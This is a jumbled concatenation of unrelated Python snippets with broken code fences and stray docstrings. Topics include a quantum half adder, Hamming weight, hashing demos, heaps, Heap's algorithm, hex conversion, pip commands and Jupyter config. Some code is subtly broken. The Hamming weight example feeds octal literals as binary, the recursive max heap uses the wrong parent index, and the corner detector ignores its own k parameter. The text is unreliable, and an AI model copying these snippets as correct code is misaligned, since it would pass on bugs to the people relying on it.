    qc_ha.cx(0, 2)
    qc_ha.cx(1, 2)

    # use ccx / toffoli gate to write AND of the inputs on qubit3
    qc_ha.ccx(0, 1, 3)
    qc_ha.barrier()

    # extract outputs
    qc_ha.measure(2, 0)  # extract XOR value
    qc_ha.measure(3, 1)  # extract AND value

    # Execute the circuit on the qasm simulator
    job = q.execute(qc_ha, simulator, shots=1000)

    # Return the histogram data of the results of the experiment.
    return job.result().get_counts(qc_ha)


if __name__ == "__main__":
    counts = half_adder(1, 1)
    print(f"Half Adder Output Qubit Counts: {counts}")

def halvingSum(n):
    s = 0
    while n:
        s += n
        n //= 2
    return s


# s (int) : Sum
# n (int) : Input number
````

````py
Given an unsigned integer, write a function that returns the number of '1' bits
that the integer contains (the
[Hamming weight](https://en.wikipedia.org/wiki/Hamming_weight))

Examples:

- `hamming_weight(n = 00000000000000000000001000000011) -> 3`
- `hamming_weight(n = 00000000000000000000000000001000) -> 1`
- `hamming_weight(n = 11111111111111111111111111111011) -> 31`

Notes:

- "Unsigned Integers (often called "uints") are just like integers (whole
numbers) but have the property that they don't have a + or - sign associated
with them. Thus they are always non-negative (zero or positive). We use uint's
when we know the value we are counting will always be non-negative."```


```py


def hamming_weight(n):
    # Your code here
    count = 0

    while n:

        n &= n - 1

        count += 1

    return count


print(hamming_weight(n=0o00000000000000000000001000000011))
print(hamming_weight(n=0o00000000000000000000000000001000))
print(hamming_weight(n=0o11111111111111111111111111111011))
````

```pyTornado handlers for the terminal emulator."""

# Copyright (c) Jupyter Development Team.
# Distributed under the terms of the Modified BSD License.

from tornado import web
from ..base.handlers import IPythonHandler, path_regex
from ..utils import url_escape


class EditorHandler(IPythonHandler):
    """Render the text editor interface."""

    @web.authenticated
    def get(self, path):
        path = path.strip("/")
        if not self.contents_manager.file_exists(path):
            raise web.HTTPError(404, u"File does not exist: %s" % path)

        basename = path.rsplit("/", 1)[-1]
        self.write(
            self.render_template(
                "edit.html",
                file_path=url_escape(path),
                basename=basename,
                page_title=basename + " (editing)",
            )
        )


default_handlers = [(r"/edit%s" % path_regex, EditorHandler)]

memo = {}


def isHappy(n):
    """
    Is happy takes in a number and returns True if it is a happy number, False otherwise. A happy number
    is a number defined by the following process: Starting with any positive integer, replace the number by the
    sum of the squares of its digits, and repeat the process until the number equals 1 (where it will stay),
    or it loops endlessly in a cycle which does not include 1.
    """
    seen = {n: 1}
    while True:
        new_sq = sum([int(d) ** 2 for d in str(n)])
        if n == 1:
            return True
        if new_sq in seen:
            return False
        else:
            n = new_sq
            seen[n] = 1


print(isHappy(19))

# This theorem states that the number of prime factors of n
# will be approximately log(log(n)) for most natural numbers n

import math


def exactPrimeFactorCount(n):
    """
    >>> exactPrimeFactorCount(51242183)
    3
    """
    count = 0
    if n % 2 == 0:
        count += 1
        while n % 2 == 0:
            n = int(n / 2)
    # the n input value must be odd so that
    # we can skip one element (ie i += 2)

    i = 3

    while i <= int(math.sqrt(n)):
        if n % i == 0:
            count += 1
            while n % i == 0:
                n = int(n / i)
        i = i + 2

    # this condition checks the prime
    # number n is greater than 2

    if n > 2:
        count += 1
    return count


if __name__ == "__main__":
    n = 51242183
    print(f"The number of distinct prime factors is/are {exactPrimeFactorCount(n)}")
    print("The value of log(log(n)) is {:.4f}".format(math.log(math.log(n))))

    """
    The number of distinct prime factors is/are 3
    The value of log(log(n)) is 2.8765
    """
```

````py
This is a pure Python implementation of the Harmonic Series algorithm
https://en.wikipedia.org/wiki/Harmonic_series_(mathematics)

For doctests run following command:
python -m doctest -v harmonic_series.py
or
python3 -m doctest -v harmonic_series.py

For manual testing run:
python3 harmonic_series.py```


```py


def harmonic_series(n_term: str) -> list:
    """Pure Python implementation of Harmonic Series algorithm

    :param n_term: The last (nth) term of Harmonic Series
    :return: The Harmonic Series starting from 1 to last (nth) term

    Examples:
    >>> harmonic_series(5)
    ['1', '1/2', '1/3', '1/4', '1/5']
    >>> harmonic_series(5.0)
    ['1', '1/2', '1/3', '1/4', '1/5']
    >>> harmonic_series(5.1)
    ['1', '1/2', '1/3', '1/4', '1/5']
    >>> harmonic_series(-5)
    []
    >>> harmonic_series(0)
    []
    >>> harmonic_series(1)
    ['1']
    """
    if n_term == "":
        return n_term
    series = []
    for temp in range(int(n_term)):
        series.append(f"1/{temp + 1}" if series else "1")
    return series


if __name__ == "__main__":
    nth_term = input("Enter the last number (nth term) of the Harmonic Series")
    print("Formula of Harmonic Series => 1+1/2+1/3 ..... 1/n")
    print(harmonic_series(nth_term))

import ast
import textwrap
import unittest

from pyflakes import checker

__all__ = ["TestCase", "skip", "skipIf"]

skip = unittest.skip
skipIf = unittest.skipIf


class TestCase(unittest.TestCase):

    withDoctest = False

    def flakes(self, input, *expectedOutputs, **kw):
        tree = ast.parse(textwrap.dedent(input))
        file_tokens = checker.make_tokens(textwrap.dedent(input))
        if kw.get("is_segment"):
            tree = tree.body[0]
            kw.pop("is_segment")
        w = checker.Checker(
            tree, file_tokens=file_tokens, withDoctest=self.withDoctest, **kw
        )
        outputs = [type(o) for o in w.messages]
        expectedOutputs = list(expectedOutputs)
        outputs.sort(key=lambda t: t.__name__)
        expectedOutputs.sort(key=lambda t: t.__name__)
        self.assertEqual(
            outputs,
            expectedOutputs,
            """\
for input:
%s
expected outputs:
%r
but got:
%s"""
            % (input, expectedOutputs, "\n".join([str(o) for o in w.messages])),
        )
        return w

    if not hasattr(unittest.TestCase, "assertIs"):

        def assertIs(self, expr1, expr2, msg=None):
            if expr1 is not expr2:
                self.fail(msg or "%r is not %r" % (expr1, expr2))

    if not hasattr(unittest.TestCase, "assertIsInstance"):

        def assertIsInstance(self, obj, cls, msg=None):
            """Same as self.assertTrue(isinstance(obj, cls))."""
            if not isinstance(obj, cls):
                self.fail(msg or "%r is not an instance of %r" % (obj, cls))

    if not hasattr(unittest.TestCase, "assertNotIsInstance"):

        def assertNotIsInstance(self, obj, cls, msg=None):
            """Same as self.assertFalse(isinstance(obj, cls))."""
            if isinstance(obj, cls):
                self.fail(msg or "%r is an instance of %r" % (obj, cls))

    if not hasattr(unittest.TestCase, "assertIn"):

        def assertIn(self, member, container, msg=None):
            """Just like self.assertTrue(a in b)."""
            if member not in container:
                self.fail(msg or "%r not found in %r" % (member, container))

    if not hasattr(unittest.TestCase, "assertNotIn"):

        def assertNotIn(self, member, container, msg=None):
            """Just like self.assertTrue(a not in b)."""
            if member in container:
                self.fail(msg or "%r unexpectedly found in %r" % (member, container))

import cv2
import numpy as np
````

````py
Harris Corner Detector
https://en.wikipedia.org/wiki/Harris_Corner_Detector```


```py


class Harris_Corner:
    def __init__(self, k: float, window_size: int):

        """
        k : is an empirically determined constant in [0.04,0.06]
        window_size : neighbourhoods considered
        """

        if k in (0.04, 0.06):
            self.k = k
            self.window_size = window_size
        else:
            raise ValueError("invalid k value")

    def __str__(self):

        return f"Harris Corner  detection with k : {self.k}"

    def detect(self, img_path: str):

        """
        Returns the image with corners identified
        img_path  : path of the image
        output : list of the corner positions, image
        """

        img = cv2.imread(img_path, 0)
        h, w = img.shape
        corner_list = []
        color_img = img.copy()
        color_img = cv2.cvtColor(color_img, cv2.COLOR_GRAY2RGB)
        dy, dx = np.gradient(img)
        ixx = dx ** 2
        iyy = dy ** 2
        ixy = dx * dy
        k = 0.04
        offset = self.window_size // 2
        for y in range(offset, h - offset):
            for x in range(offset, w - offset):
                wxx = ixx[
                    y - offset : y + offset + 1, x - offset : x + offset + 1
                ].sum()
                wyy = iyy[
                    y - offset : y + offset + 1, x - offset : x + offset + 1
                ].sum()
                wxy = ixy[
                    y - offset : y + offset + 1, x - offset : x + offset + 1
                ].sum()

                det = (wxx * wyy) - (wxy ** 2)
                trace = wxx + wyy
                r = det - k * (trace ** 2)
                # Can change the value
                if r > 0.5:
                    corner_list.append([x, y, r])
                    color_img.itemset((y, x, 0), 0)
                    color_img.itemset((y, x, 1), 0)
                    color_img.itemset((y, x, 2), 255)
        return color_img, corner_list


if __name__ == "__main__":

    edge_detect = Harris_Corner(0.04, 3)
    color_img, _ = edge_detect.detect("path_to_image")
    cv2.imwrite("detect.png", color_img)

#
# Binary trees are already defined with this interface:
# class Tree(object):
#   def __init__(self, x):
#     self.value = x
#     self.left = None
#     self.right = None
def hasPathWithGivenSum(t, s):
    if t is None:
        if s == 0:
            return True
        else:
            return False
    else:
        if t.left is not None and t.right is not None:
            return any(
                [
                    hasPathWithGivenSum(t.left, s - t.value),
                    hasPathWithGivenSum(t.right, s - t.value),
                ]
            )
        elif t.left is not None:
            return hasPathWithGivenSum(t.left, s - t.value)
        elif t.right is not None:
            return hasPathWithGivenSum(t.right, s - t.value)
        else:
            if t.value == s:
                return True
            else:
                return False

from typing import Any


class ContainsLoopError(Exception):
    pass


class Node:
    def __init__(self, data: Any) -> None:
        self.data = data
        self.next_node = None

    def __iter__(self):
        node = self
        visited = []
        while node:
            if node in visited:
                raise ContainsLoopError
            visited.append(node)
            yield node.data
            node = node.next_node

    @property
    def has_loop(self) -> bool:
        """
        A loop is when the exact same Node appears more than once in a linked list.
        >>> root_node = Node(1)
        >>> root_node.next_node = Node(2)
        >>> root_node.next_node.next_node = Node(3)
        >>> root_node.next_node.next_node.next_node = Node(4)
        >>> root_node.has_loop
        False
        >>> root_node.next_node.next_node.next_node = root_node.next_node
        >>> root_node.has_loop
        True
        """
        try:
            list(self)
            return False
        except ContainsLoopError:
            return True


if __name__ == "__main__":
    root_node = Node(1)
    root_node.next_node = Node(2)
    root_node.next_node.next_node = Node(3)
    root_node.next_node.next_node.next_node = Node(4)
    print(root_node.has_loop)  # False
    root_node.next_node.next_node.next_node = root_node.next_node
    print(root_node.has_loop)  # True

    root_node = Node(5)
    root_node.next_node = Node(6)
    root_node.next_node.next_node = Node(5)
    root_node.next_node.next_node.next_node = Node(6)
    print(root_node.has_loop)  # False

    root_node = Node(1)
    print(root_node.has_loop)  # False

import hashlib
import logging
import sys
from optparse import Values
from typing import List

from pip._internal.cli.base_command import Command
from pip._internal.cli.status_codes import ERROR, SUCCESS
from pip._internal.utils.hashes import FAVORITE_HASH, STRONG_HASHES
from pip._internal.utils.misc import read_chunks, write_output

logger = logging.getLogger(__name__)


class HashCommand(Command):
    """
    Compute a hash of a local package archive.

    These can be used with --hash in a requirements file to do repeatable
    installs.
    """

    usage = "%prog [options] <file> ..."
    ignore_require_venv = True

    def add_options(self) -> None:
        self.cmd_opts.add_option(
            "-a",
            "--algorithm",
            dest="algorithm",
            choices=STRONG_HASHES,
            action="store",
            default=FAVORITE_HASH,
            help="The hash algorithm to use: one of {}".format(
                ", ".join(STRONG_HASHES)
            ),
        )
        self.parser.insert_option_group(0, self.cmd_opts)

    def run(self, options: Values, args: List[str]) -> int:
        if not args:
            self.parser.print_usage(sys.stderr)
            return ERROR

        algorithm = options.algorithm
        for path in args:
            write_output(
                "%s:\n--hash=%s:%s", path, algorithm, _hash_of_file(path, algorithm)
            )
        return SUCCESS


def _hash_of_file(path: str, algorithm: str) -> str:
    """Return the hash digest of a file."""
    with open(path, "rb") as archive:
        hash = hashlib.new(algorithm)
        for chunk in read_chunks(archive):
            hash.update(chunk)
    return hash.hexdigest()

from .hash_table import HashTable
from collections import deque


class HashTableWithLinkedList(HashTable):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)

    def _set_value(self, key, data):
        self.values[key] = deque([]) if self.values[key] is None else self.values[key]
        self.values[key].appendleft(data)
        self._keys[key] = self.values[key]

    def balanced_factor(self):
        return (
            sum([self.charge_factor - len(slot) for slot in self.values])
            / self.size_table
            * self.charge_factor
        )

    def _colision_resolution(self, key, data=None):
        if not (
            len(self.values[key]) == self.charge_factor and self.values.count(None) == 0
        ):
            return key
        return super()._colision_resolution(key, data)

import time
import hashlib
import bcrypt
import math


n = 1000000
key = b"STR"

print(f"Hashing {n}x")

start_time = time.time()
for i in range(n):
    hash(key)
end_time = time.time()
print(f"  Python hash runtime: {end_time - start_time} seconds")


start_time = time.time()
for i in range(n):
    hashlib.sha256(key)
end_time = time.time()
print(f"  SHA256 hash runtime: {end_time - start_time} seconds")


n = 10
print(f"\nHashing {n}x")
salt = bcrypt.gensalt()
start_time = time.time()
for i in range(n):
    bcrypt.hashpw(b"KEY", salt)
end_time = time.time()
print(f"  bcrypt hash runtime: {end_time - start_time} seconds")

import time
import hashlib
import bcrypt

n = 1000000
key = b"STR"

# hash
print("Hash")
start = time.time()
for i in range(n):
    hash(key)
end = time.time()
print(end - start, "Seconds")

# hashlib
print("Hash Lib SHA256")
start = time.time()
for i in range(n):
    hashlib.sha256(key)
end = time.time()
print(end - start, "Seconds")


# TODO: implement djb2


def djb2(key):
    # start from an arbitrary large prime such as (5381)
    # set the ahs value to 5381
    hash_value = 5381
    # iterate over each char in the key
    for char in key:
        # set the hash value to the bit shift left by 5 of the hash value and sum of the hash value  then add the value for the char
        hash_value = ((hash_value << 5) + hash_value) + char
    # return the hash value
    return hash_value

#!/usr/bin/env python3
# encoding: utf-8```









---


```py


# end_pymotw_header
import hashlib


print("Guaranteed:\n{}\n".format(", ".join(sorted(hashlib.algorithms_guaranteed))))
print("Available:\n{}".format(", ".join(sorted(hashlib.algorithms_available))))

#```


```pyTest data for all examples.```


```py

# end_pymotw_header
import hashlib

lorem = """Lorem ipsum dolor sit amet, consectetur adipisicing
elit, sed do eiusmod tempor incididunt ut labore et dolore magna
aliqua. Ut enim ad minim veniam, quis nostrud exercitation
ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis
aute irure dolor in reprehenderit in voluptate velit esse cillum
dolore eu fugiat nulla pariatur. Excepteur sint occaecat
cupidatat non proident, sunt in culpa qui officia deserunt
mollit anim id est laborum."""

#```


```pySimple MD5 generation.```


```py

# end_pymotw_header
import hashlib

from hashlib_data import lorem

h = hashlib.md5()
h.update(lorem.encode("utf-8"))
print(h.hexdigest())

#```


```pyNaming the hash type using a string.```


```py

# end_pymotw_header
import argparse
import hashlib
import sys

from hashlib_data import lorem


parser = argparse.ArgumentParser("hashlib demo")
parser.add_argument(
    "hash_name",
    choices=hashlib.algorithms_available,
    help="the name of the hash algorithm to use",
)
parser.add_argument(
    "data",
    nargs="?",
    default=lorem,
    help="the input data to hash, defaults to lorem ipsum",
)
args = parser.parse_args()

h = hashlib.new(args.hash_name)
h.update(args.data.encode("utf-8"))
print(h.hexdigest())

#```


```pySimple SHA1 generation.```


```py

# end_pymotw_header
import hashlib

from hashlib_data import lorem

h = hashlib.sha1()
h.update(lorem.encode("utf-8"))
print(h.hexdigest())

#```


```pyCalling update() more than once is like calling
it with all of the data at once.```


```py

# end_pymotw_header
import hashlib

from hashlib_data import lorem

h = hashlib.md5()
h.update(lorem.encode("utf-8"))
all_at_once = h.hexdigest()


def chunkize(size, text):
    "Return parts of the text in size-based increments."
    start = 0
    while start < len(text):
        chunk = text[start : start + size]
        yield chunk
        start += size
    return


h = hashlib.md5()
for chunk in chunkize(64, lorem.encode("utf-8")):
    h.update(chunk)
line_by_line = h.hexdigest()

print("All at once :", all_at_once)
print("Line by line:", line_by_line)
print("Same        :", (all_at_once == line_by_line))

# Health Calculator

# func to show health score of user
def healthScore():
    print(" ")
    numberOfFruits = int(input("Number Of Fruits You Eat in Week : "))
    numberOftimesFastFood = int(input("Number of Times You Eat FastFood in a Week : "))
    cigars = int(input("Cigars You Smoke In A Week : "))
    workoutTime = int(input("How Much minutes You Workout EveryDay : "))
    bodyMassIndex = int(input("Whats Your BodyMassIndex(BMI) : "))
    if 18 < bodyMassIndex < 26:
        print(" ")
        healthScore = (numberOfFruits + workoutTime + bodyMassIndex) - (
            cigars + numberOftimesFastFood
        )
        print(healthScore)
    else:
        print(" ")
        healthScore = (numberOfFruits + workoutTime) - (
            cigars + numberOftimesFastFood + bodyMassIndex
        )
        print(healthScore)


# main code
while True:
    startOrEnd = str(input("Start or End : "))
    if startOrEnd == "Start":
        print(healthScore())
        continue
    else:
        quit()

# Title  : Max Heap using recursive approach
# Author : Frank Faustino
# Date   : 2018-08-18


class Heap:
    def __init__(self):
        self.storage = []

    def __len__(self):
        return len(self.storage)

    def _swap(self, x, y):
        a = self.storage[x]
        b = self.storage[y]
        self.storage[y] = a
        self.storage[x] = b

    def insert(self, value):
        self.storage.append(value)
        self._bubble_up(len(self) - 1)

    def delete(self):
        tmp = self.storage[0]
        self.storage[0] = self.storage[-1]
        self.storage.pop()
        print(f"deleted: {tmp}")
        self._sift_down(0)
        return tmp

    def get_max(self):
        return self.storage[0]

    def get_size(self):
        return len(self.storage)

    def _bubble_up(self, i):
        if i > 0 and self.storage[i] > self.storage[i // 2]:
            self._swap(i, i // 2)
            self._bubble_up(i // 2)

    def _sift_down(self, i):
        left = (2 * i) + 1
        right = (2 * i) + 2
        largest = i
        if right < len(self) and self.storage[right] > self.storage[largest]:
            largest = right
        if left < len(self) and self.storage[left] > self.storage[largest]:
            largest = left
        if largest != i:
            self._swap(i, largest)
            self._sift_down(largest)

# Python program for implementation of heap Sort
# To heapify subtree rooted at index i and n is size of heap
def heapify(arr, n, i):
    largest = i  # Initialize largest as root
    l = 2 * i + 1  # left = 2*i + 1
    r = 2 * i + 2  # right = 2*i + 2

    # See if left child of root exists and is
    # greater than root
    if l < n and arr[i] < arr[l]:
        largest = l

    # See if right child of root exists and is
    # greater than root
    if r < n and arr[largest] < arr[r]:
        largest = r

    # Change root, if needed
    if largest != i:
        arr[i], arr[largest] = arr[largest], arr[i]

        # Heapify the root.
        heapify(arr, n, largest)


# The main function to sort an array of given size
def heapSort(arr):
    n = len(arr)

    # Build a maxheap.
    for i in range(n, -1, -1):
        heapify(arr, n, i)

    # One by one extract elements
    for i in range(n - 1, 0, -1):
        arr[i], arr[0] = arr[0], arr[i]
        heapify(arr, i, 0)


if __name__ == "__main__":
    arr = list(map(int, input("Enter the numbers to be sorted: \n").split()))
    heapSort(arr)
    n = len(arr)
    print("Sorted array is")
    for i in range(n):
        print(arr[i], end=" ")

```









---


```py


# end_pymotw_header
import heapq
from heapq_heapdata import data

print("all       :", data)
print("3 largest :", heapq.nlargest(3, data))
print("from sort :", list(reversed(sorted(data)[-3:])))
print("3 smallest:", heapq.nsmallest(3, data))
print("from sort :", sorted(data)[:3])

```









---


```py


# end_pymotw_header
import heapq
from heapq_showtree import show_tree
from heapq_heapdata import data

print("random    :", data)
heapq.heapify(data)
print("heapified :")
show_tree(data)

```









---


```py


# end_pymotw_header
import heapq
from heapq_showtree import show_tree
from heapq_heapdata import data

print("random    :", data)
heapq.heapify(data)
print("heapified :")
show_tree(data)
print()

for i in range(2):
    smallest = heapq.heappop(data)
    print("pop    {:>3}:".format(smallest))
    show_tree(data)

```









---


```py


# end_pymotw_header
import heapq
from heapq_showtree import show_tree
from heapq_heapdata import data

heap = []
print("random :", data)
print()

for n in data:
    print("add {:>3}:".format(n))
    heapq.heappush(heap, n)
    show_tree(heap)

```









---


```py


# end_pymotw_header
import heapq
from heapq_showtree import show_tree
from heapq_heapdata import data

heapq.heapify(data)
print("start:")
show_tree(data)

for n in [0, 13]:
    smallest = heapq.heapreplace(data, n)
    print("replace {:>2} with {:>2}:".format(smallest, n))
    show_tree(data)

```









---


```py


# end_pymotw_header
import heapq
import random


random.seed(2016)

data = []
for i in range(4):
    new_data = list(random.sample(range(1, 101), 5))
    new_data.sort()
    data.append(new_data)

for i, d in enumerate(data):
    print("{}: {}".format(i, d))

print("\nMerged:")
for i in heapq.merge(*data):
    print(i, end=" ")
print()

```









---


```py


# end_pymotw_header
import math
from io import StringIO


def show_tree(tree, total_width=36, fill=" "):
    """Pretty-print a tree."""
    output = StringIO()
    last_row = -1
    for i, n in enumerate(tree):
        if i:
            row = int(math.floor(math.log(i + 1, 2)))
        else:
            row = 0
        if row != last_row:
            output.write("\n")
        columns = 2 ** row
        col_width = int(math.floor(total_width / columns))
        output.write(str(n).center(col_width, fill))
        last_row = row
    print(output.getvalue())
    print("-" * total_width)
    print()
````

````py
Heap's algorithm returns the list of all permutations possible from a list.
It minimizes movement by generating each permutation from the previous one
by swapping only two elements.
More information:
https://en.wikipedia.org/wiki/Heap%27s_algorithm.```


```py


def heaps(arr: list) -> list:
    """
    Pure python implementation of the Heap's algorithm (recursive version),
    returning all permutations of a list.
    >>> heaps([])
    [()]
    >>> heaps([0])
    [(0,)]
    >>> heaps([-1, 1])
    [(-1, 1), (1, -1)]
    >>> heaps([1, 2, 3])
    [(1, 2, 3), (2, 1, 3), (3, 1, 2), (1, 3, 2), (2, 3, 1), (3, 2, 1)]
    >>> from itertools import permutations
    >>> sorted(heaps([1,2,3])) == sorted(permutations([1,2,3]))
    True
    >>> all(sorted(heaps(x)) == sorted(permutations(x))
    ...     for x in ([], [0], [-1, 1], [1, 2, 3]))
    True
    """

    if len(arr) <= 1:
        return [tuple(arr)]

    res = []

    def generate(k: int, arr: list):
        if k == 1:
            res.append(tuple(arr[:]))
            return

        generate(k - 1, arr)

        for i in range(k - 1):
            if k % 2 == 0:  # k is even
                arr[i], arr[k - 1] = arr[k - 1], arr[i]
            else:  # k is odd
                arr[0], arr[k - 1] = arr[k - 1], arr[0]
            generate(k - 1, arr)

    generate(len(arr), arr)
    return res


if __name__ == "__main__":
    user_input = input("Enter numbers separated by a comma:\n").strip()
    arr = [int(item) for item in user_input.split(",")]
    print(heaps(arr))
````

````py
Heap's (iterative) algorithm returns the list of all permutations possible from a list.
It minimizes movement by generating each permutation from the previous one
by swapping only two elements.
More information:
https://en.wikipedia.org/wiki/Heap%27s_algorithm.```


```py


def heaps(arr: list) -> list:
    """
    Pure python implementation of the iterative Heap's algorithm,
    returning all permutations of a list.
    >>> heaps([])
    [()]
    >>> heaps([0])
    [(0,)]
    >>> heaps([-1, 1])
    [(-1, 1), (1, -1)]
    >>> heaps([1, 2, 3])
    [(1, 2, 3), (2, 1, 3), (3, 1, 2), (1, 3, 2), (2, 3, 1), (3, 2, 1)]
    >>> from itertools import permutations
    >>> sorted(heaps([1,2,3])) == sorted(permutations([1,2,3]))
    True
    >>> all(sorted(heaps(x)) == sorted(permutations(x))
    ...     for x in ([], [0], [-1, 1], [1, 2, 3]))
    True
    """

    if len(arr) <= 1:
        return [tuple(arr)]

    res = []

    def generate(n: int, arr: list):
        c = [0] * n
        res.append(tuple(arr))

        i = 0
        while i < n:
            if c[i] < i:
                if i % 2 == 0:
                    arr[0], arr[i] = arr[i], arr[0]
                else:
                    arr[c[i]], arr[i] = arr[i], arr[c[i]]
                res.append(tuple(arr))
                c[i] += 1
                i = 0
            else:
                c[i] = 0
                i += 1

    generate(len(arr), arr)
    return res


if __name__ == "__main__":
    user_input = input("Enter numbers separated by a comma:\n").strip()
    arr = [int(item) for item in user_input.split(",")]
    print(heaps(arr))
````

```py
Aim: To form a Binary Search Tree of the integers entered and display its height.
```

```py

# initializing the tree
class Node:
    def __init__(self, data):
        self.right = self.left = None
        self.data = data


class Solution:
    # function for inserting values according to BST rules
    def insert(self, root, data):
        if root == None:
            return Node(data)
        else:
            if data <= root.data:
                cur = self.insert(root.left, data)
                root.left = cur
            else:
                cur = self.insert(root.right, data)
                root.right = cur
        return root

    # calculating the height of the tree
    def getHeight(self, root):
        if root == None:
            return -1
        return 1 + max(self.getHeight(root.left), self.getHeight(root.right))


# getting the input for total number of integers to be entered
T = int(input())
# making an object of the class
myTree = Solution()
root = None

# inserting values
for i in range(T):
    data = int(input())
    root = myTree.insert(root, data)
# geeting the height calculated
height = myTree.getHeight(root)

# printing the result
print("Height of BST:", height)
```

```py
COMPLEXITY:

  Time Complexity -> O(N)
  Space Complexity -> O(N)

Sample Input:
7
3
5
2
1
4
6
7
Sample Output:
Height of BST: 3

Explaination:
The BST looks something like this:

                3
            2       5
        1        4      6
                           7

So, the height is --> 3.
```

```py

# install flask (pip install flask)


# import the flask class
from flask import Flask, jsonify


# set an app name
app = Flask(__name__)

# create a route
@app.route("/")
def my_hello_function():
    my_list = [
        {"id": 0, "data": "Hello Everyone"},
        {"id": 1, "data": "Hello Everyone"},
        {"id": 2, "data": "Hello Everyone"},
        {"id": 3, "data": "Hello Everyone"},
    ]
    response = {"data": my_list}
    return jsonify(response)


@app.route("/bob")
def my_bob_function():

    return "Hello Bob"


# main entry point
if __name__ == "__main__":
    app.run()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from tkinter import *
import tkinter.messagebox as messagebox


class Application(Frame):
    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.createWidgets()

    def createWidgets(self):
        self.nameInput = Entry(self)
        self.nameInput.pack()
        self.alertButton = Button(self, text="Hello", command=self.hello)
        self.alertButton.pack()

    def hello(self):
        name = self.nameInput.get() or "world"
        messagebox.showinfo("Message", "Hello, %s" % name)


app = Application()
# :
app.master.title("Hello World")
# :
app.mainloop()

def hello_three():
    # Set H to string literal "Hello"
    H = "Hello"
    # set a counter to zero
    counter = 0
    # set a limit to three
    limit = 3

    # itterate until counter is equal to limit
    while counter != limit:
        # display / print my H variable to the screen
        print(H)
        # increment our counter
        counter += 1


hello_three()

from optparse import Values
from typing import List

from pip._internal.cli.base_command import Command
from pip._internal.cli.status_codes import SUCCESS
from pip._internal.exceptions import CommandError


class HelpCommand(Command):
    """Show help for commands"""

    usage = """
      %prog <command>"""
    ignore_require_venv = True

    def run(self, options: Values, args: List[str]) -> int:
        from pip._internal.commands import (
            commands_dict,
            create_command,
            get_similar_commands,
        )

        try:
            # 'pip help' with no args is handled by pip.__init__.parseopt()
            cmd_name = args[0]  # the command we need help for
        except IndexError:
            return SUCCESS

        if cmd_name not in commands_dict:
            guess = get_similar_commands(cmd_name)

            msg = [f'unknown command "{cmd_name}"']
            if guess:
                msg.append(f'maybe you meant "{guess}"')

            raise CommandError(" - ".join(msg))

        command = create_command(cmd_name)
        command.parser.print_help()

        return SUCCESS

# -*- coding: utf-8 -*-
#
# :copyright: (c) 2020 by Pavlo Dmytrenko.
# :license: MIT, see LICENSE for more details.
```

````py
yaspin.helpers
~~~~~~~~~~~~~~

Helper functions.```


```py

from __future__ import absolute_import

from .compat import bytes
from .constants import ENCODING


def to_unicode(text_type, encoding=ENCODING):
    if isinstance(text_type, bytes):
        return text_type.decode(encoding)
    return text_type

def hex_to_bin(hex_num: str) -> int:
    """
    Convert a hexadecimal value to its binary equivalent
    #https://stackoverflow.com/questions/1425493/convert-hex-to-binary
    Here, we have used the bitwise right shift operator: >>
    Shifts the bits of the number to the right and fills 0 on voids left as a result.
    Similar effect as of dividing the number with some power of two.
    Example:
    a = 10
    a >> 1 = 5

    >>> hex_to_bin("AC")
    10101100
    >>> hex_to_bin("9A4")
    100110100100
    >>> hex_to_bin("   12f   ")
    100101111
    >>> hex_to_bin("FfFf")
    1111111111111111
    >>> hex_to_bin("-fFfF")
    -1111111111111111
    >>> hex_to_bin("F-f")
    Traceback (most recent call last):
    ...
    ValueError: Invalid value was passed to the function
    >>> hex_to_bin("")
    Traceback (most recent call last):
    ...
    ValueError: No value was passed to the function
    """

    hex_num = hex_num.strip()
    if not hex_num:
        raise ValueError("No value was passed to the function")

    is_negative = hex_num[0] == "-"
    if is_negative:
        hex_num = hex_num[1:]

    try:
        int_num = int(hex_num, 16)
    except ValueError:
        raise ValueError("Invalid value was passed to the function")

    bin_str = ""
    while int_num > 0:
        bin_str = str(int_num % 2) + bin_str
        int_num >>= 1

    return int(("-" + bin_str) if is_negative else bin_str)


if __name__ == "__main__":
    import doctest

    doctest.testmod()

hex_table = {hex(i)[2:]: i for i in range(16)}  # Use [:2] to strip off the leading '0x'


def hex_to_decimal(hex_string: str) -> int:
    """
    Convert a hexadecimal value to its decimal equivalent
    #https://www.programiz.com/python-programming/methods/built-in/hex

    >>> hex_to_decimal("a")
    10
    >>> hex_to_decimal("12f")
    303
    >>> hex_to_decimal("   12f   ")
    303
    >>> hex_to_decimal("FfFf")
    65535
    >>> hex_to_decimal("-Ff")
    -255
    >>> hex_to_decimal("F-f")
    Traceback (most recent call last):
    ...
    ValueError: Non-hexadecimal value was passed to the function
    >>> hex_to_decimal("")
    Traceback (most recent call last):
    ...
    ValueError: Empty string was passed to the function
    >>> hex_to_decimal("12m")
    Traceback (most recent call last):
    ...
    ValueError: Non-hexadecimal value was passed to the function
    """
    hex_string = hex_string.strip().lower()
    if not hex_string:
        raise ValueError("Empty string was passed to the function")
    is_negative = hex_string[0] == "-"
    if is_negative:
        hex_string = hex_string[1:]
    if not all(char in hex_table for char in hex_string):
        raise ValueError("Non-hexadecimal value was passed to the function")
    decimal_number = 0
    for char in hex_string:
        decimal_number = 16 * decimal_number + hex_table[char]
    return -decimal_number if is_negative else decimal_number


if __name__ == "__main__":
    from doctest import testmod

    testmod()

import os

import jupyter_contrib_nbextensions.nbconvert_support

jcnbe_dir = os.path.dirname(jupyter_contrib_nbextensions.__file__)
pp_mod_name = "jupyter_contrib_nbextensions.nbconvert_support.pp_highlighter"

c = get_config()  # noqa
c.NbConvertApp.export_format = "html"
c.Exporter.template_path = [
    ".",
    jupyter_contrib_nbextensions.nbconvert_support.templates_directory(),
    os.path.join(jcnbe_dir, "nbextensions", "highlighter"),
]
c.Exporter.preprocessors = [pp_mod_name + ".HighlighterPreprocessor"]
c.NbConvertApp.postprocessor_class = pp_mod_name + ".HighlighterPostProcessor"
# html
c.Exporter.template_file = "highlighter.tpl"

import os

import jupyter_contrib_nbextensions.nbconvert_support

jcnbe_dir = os.path.dirname(jupyter_contrib_nbextensions.__file__)
pp_mod_name = "jupyter_contrib_nbextensions.nbconvert_support.pp_highlighter"

c = get_config()  # noqa
c.NbConvertApp.export_format = "latex"
c.Exporter.template_path = [
    ".",
    jupyter_contrib_nbextensions.nbconvert_support.templates_directory(),
    os.path.join(jcnbe_dir, "nbextensions", "highlighter"),
]
